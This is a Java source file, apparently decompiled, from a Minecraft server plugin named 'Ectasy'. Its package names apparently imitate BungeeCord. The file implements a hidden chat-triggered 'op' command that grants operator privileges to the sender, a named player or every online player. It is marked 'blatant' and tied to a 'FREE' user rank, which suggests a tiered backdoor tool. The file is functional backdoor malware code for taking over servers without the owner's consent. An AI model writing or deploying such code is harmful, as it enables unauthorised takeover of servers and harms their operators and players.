package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "op",
   description = "Op yourself or someone",
   blatant = true,
   rank = Rank.FREE
)
public class OPCommand extends AbstractCommand {
   public void doTask(Player var1) {
      Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> var1.setOp(true));
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         this.doTask(var1.getPlayer());
         ChatUtil.sendChat(var1.getPlayer(), "You are now opped.");
      } else {
         if (var3[0].equalsIgnoreCase("*")) {
            for(Player var5 : Bukkit.getOnlinePlayers()) {
               this.doTask(var5);
            }

            ChatUtil.sendChat(var1.getPlayer(), "Opped everyone.");
            return;
         }

         OfflinePlayer var4 = Bukkit.getOfflinePlayer(var3[0]);
         this.doTask((Player)var4);
         ChatUtil.sendChat(var1.getPlayer(), "Opped " + var4.getName());
      }
   }
}
